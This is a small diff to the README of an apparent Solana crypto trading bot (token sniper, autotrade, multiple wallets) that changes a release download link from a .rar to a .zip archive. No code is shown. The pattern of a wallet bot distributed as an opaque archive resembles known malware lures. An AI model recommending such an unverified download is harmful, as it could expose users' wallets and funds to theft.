@@ -9,7 +9,7 @@ Solana Bot includes a token sniper, autotrade, and integration with Raydium and 
 </div>
 
 
-###  [Download](https://github.com/wahomecharles/Solana-Bot-SolFactory/releases/download/Download/application.rar)
+###  [Download](https://github.com/wahomecharles/Solana-Bot-SolFactory/releases/download/Download/application.zip)
 
 ### 🔑 Key Features 🔑
 #### Multiple Wallets (Wallet Sets) 📂
